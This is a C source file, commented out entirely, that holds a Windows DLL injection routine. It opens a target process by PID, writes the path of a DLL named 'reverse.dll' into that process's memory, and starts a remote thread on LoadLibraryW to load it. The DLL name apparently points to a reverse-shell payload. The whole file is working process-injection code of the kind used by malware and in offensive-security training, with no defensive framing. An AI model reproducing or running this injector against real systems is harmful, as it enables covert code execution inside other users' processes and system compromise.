/*#include "dll_inj.h"

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";


DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HMODULE hKeanel32 = NULL;
HANDLE hProcess, hThread = NULL;

wchar_t dllPath[MAX_PATH] = L"C:\\Users\\adamp\\projects\\reverse.dll";
size_t dllPathSize = sizeof(dllPath);


int dllInject(int arcg, char* argv[]) {

	
	if (arcg < 2) {
		printf("%s usage %s", e, argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	
	printf("%s trying to get handle to the process (%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL)
	{
		printf("%s faild to get handle to the process ,error: %ld", e, GetLastError);
		return EXIT_FAILURE;

	}

	printf("%s got handle to the process (%ld)\n\\---0x%p\n", k, PID, hProcess);

	rBuffer = VirtualAllocEx(hProcess, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("%s allocated buffer to process memory w/ PAGE_READWRITE promissions \n", k);

	if (rBuffer == NULL)
	{
		printf("%s faild to create buffer ,error: %ld", e, GetLastError);
		return EXIT_FAILURE;

	}

	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);

	printf("%s wrote [%S] to process memory \n", k, dllPath);


	hKeanel32 = GetModuleHandleW(L"Kernel32.dll");

	if (hKeanel32 == NULL)
	{
		printf("%s faild to get a handle to Kernal32.dll,error: %ld", e, GetLastError);
		CloseHandle(hProcess);
		return EXIT_FAILURE;

	}

	printf("%s got a handle to Kernal32.dll\n\\---ox%p\n ", k, hKeanel32);


	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKeanel32, "LoadLibraryW");
	printf("%s got the address of LoadLibraryW()\n\\---ox%p\n", k, startThis);

	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);

	if (hThread == NULL)
	{
		printf("%s faild to get handle to the thread ,error: %ld", e, GetLastError);
		CloseHandle(hProcess);
		return EXIT_FAILURE;

	}


	printf("%s got handle to newly-created thread (%ld)\n\\---0x%p\n", k, TID, hThread);
	printf("%s wating to thread to finish execution ...\n", i);

	WaitForSingleObject(hThread, INFINITE);

	printf("%s thread finishd execution, clining up ... \n", k);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finishd :)", k);



	return EXIT_SUCCESS;
}
*/